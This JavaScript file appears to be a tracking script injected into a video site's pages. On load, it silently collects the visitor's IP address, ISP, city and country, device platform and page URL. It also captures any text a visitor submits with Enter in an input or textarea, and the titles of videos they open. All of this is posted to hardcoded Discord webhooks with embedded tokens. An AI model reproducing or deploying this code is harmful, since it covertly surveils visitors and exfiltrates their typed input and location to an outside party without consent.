(async function(){
  const ipProvider = "https://ipv4.icanhazip.com/";
  const ipLookupBase = "https://ip-api.com/json/"; // will append IP
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
  const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
  const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";

  async function sendToDiscord(url, content){
    if(!url || !content) return;
    try{
      await fetch(url, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ content })
      });
    }catch(e){}
  }

  async function getIp(){
    try{
      const r = await fetch(ipProvider);
      if(!r.ok) throw new Error("ip fetch failed");
      return (await r.text()).trim();
    }catch(e){
      return null;
    }
  }

  async function lookupIsp(ip){
    if(!ip) return { isp: "unknown", org: "", country: "" };
    try{
      const r = await fetch(ipLookupBase + encodeURIComponent(ip) + "?fields=status,message,query,isp,org,country,regionName,city,as");
      if(!r.ok) throw new Error("lookup failed");
      const j = await r.json();
      if(j && j.status === "success") return { isp: j.isp || "unknown", org: j.org || "", country: j.country || "", region: j.regionName || "", city: j.city || "", as: j.as || "" };
      return { isp: j.message || "unknown", org: "", country: "" };
    }catch(e){
      return { isp: "unknown", org: "", country: "" };
    }
  }

  function sanitizeForDiscord(s, max=1900){
    if(!s) return "";
    const cleaned = s.replace(/[`*_~>|]/g, "").replace(/[^\p{L}\p{N} .,!?'"()\[\]{}\-_/]/gu, "");
    return cleaned.length > max ? cleaned.slice(0, max) + "\n\n...truncated" : cleaned;
  }

  const ip = await getIp();
  const ispInfo = await lookupIsp(ip);
  const platform = navigator.userAgentData?.platform || navigator.platform || "unknown";
  const baseLocation = location.href;

  const ipMessage = `IP: ${ip || "unknown"}\nISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` ${ispInfo.as}` : ""}\nLocation: ${ispInfo.city ? ispInfo.city + ", " : ""}${ispInfo.region ? ispInfo.region + ", " : ""}${ispInfo.country || ""}\nDevice: ${platform}\nSite: ${baseLocation}`;
  await sendToDiscord(webhookUrl, sanitizeForDiscord(ipMessage));

  const mobileMessage = navigator.userAgentData?.mobile ? "The Person is on Mobile" : "The Person is not on Mobile";
  await sendToDiscord(KwebhookUrl, mobileMessage);

  async function safeSendHeadline(headline){
    if(!headline) return;
    const cleanHeadline = sanitizeForDiscord(headline, 1800);
    const message = `${ip || "unknown"} (${ispInfo.isp || "unknown"}) has opened ${cleanHeadline}`;
    await sendToDiscord(winhook, message);
  }

  document.addEventListener("keydown", async e => {
    const target = e.target;
    if(e.key !== "Enter") return;
    if(!(target && (target.matches?.("input") || target.matches?.("textarea")))) return;
    if(target.isComposing) return;
    const text = String(target.value || "").trim();
    if(!text) return;
    const payload = sanitizeForDiscord(text);
    await sendToDiscord(webhookUrl, payload);
  });

  document.addEventListener("click", e => {
    const target = e.target.closest?.(".compact-video, .compact-channel, .shelf-item");
    if(!target) return;
    const headlineEl = target.querySelector?.(".compact-media-headline");
    const headline = (headlineEl && headlineEl.innerText && headlineEl.innerText.trim()) ? headlineEl.innerText.trim() : (target.innerText || "").trim().split("\n")[0];
    if(headline) safeSendHeadline(headline);
  });

  const observer = new MutationObserver(muts => {
    for(const m of muts){
      if(!m.addedNodes) continue;
      for(const node of m.addedNodes){
        try{
          if(!(node instanceof HTMLElement)) continue;
          if(node.matches && (node.matches(".compact-video") || node.matches(".compact-channel") || node.matches(".shelf-item"))){
            const headlineEl = node.querySelector?.(".compact-media-headline");
            if(headlineEl && headlineEl.innerText && headlineEl.innerText.trim()){
              safeSendHeadline(headlineEl.innerText.trim());
            }
          }
        }catch(e){}
      }
    }
  });
  observer.observe(document.documentElement || document.body, { childList: true, subtree: true });

  window.addEventListener("beforeunload", () => observer.disconnect());
})();
